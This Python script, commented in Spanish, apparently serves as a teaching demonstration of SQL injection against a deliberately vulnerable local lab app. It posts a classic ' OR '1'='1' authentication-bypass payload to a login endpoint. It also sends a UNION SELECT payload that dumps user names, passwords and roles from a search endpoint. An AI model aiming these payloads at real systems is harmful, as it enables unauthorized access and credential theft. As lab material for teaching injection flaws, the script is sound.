import json
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

# El destino está limitado a la aplicación local del laboratorio.
BASE_URL = "http://127.0.0.1:5000"


def enviar_login(payload_usuario, clave):
    datos = urlencode({
        "username": payload_usuario,
        "password": clave
    }).encode("utf-8")

    solicitud = Request(
        BASE_URL + "/api/login",
        data=datos,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST"
    )

    try:
        with urlopen(solicitud, timeout=5) as respuesta:
            return respuesta.status, json.loads(
                respuesta.read().decode("utf-8")
            )
    except HTTPError as error:
        return error.code, json.loads(error.read().decode("utf-8"))


def enviar_busqueda(payload):
    parametros = urlencode({"q": payload})
    url = BASE_URL + "/api/search?" + parametros

    try:
        with urlopen(url, timeout=5) as respuesta:
            return respuesta.status, json.loads(
                respuesta.read().decode("utf-8")
            )
    except HTTPError as error:
        return error.code, json.loads(error.read().decode("utf-8"))


def main():
    print("Demostración SQLi en el laboratorio local")

    payload_login = "admin_demo' OR '1'='1' -- "
    estado, resultado = enviar_login(payload_login, "clave_incorrecta")

    print("\n1. Bypass de autenticación")
    print("HTTP:", estado)
    print(json.dumps(resultado, indent=2, ensure_ascii=False))

    payload_union = "%' UNION SELECT usuario, clave, rol FROM usuarios -- "
    estado, resultado = enviar_busqueda(payload_union)

    print("\n2. Búsqueda UNION con datos ficticios")
    print("HTTP:", estado)
    print(json.dumps(resultado, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    try:
        main()
    except URLError:
        print("No se pudo conectar. Inicia app_vulnerable.py primero.")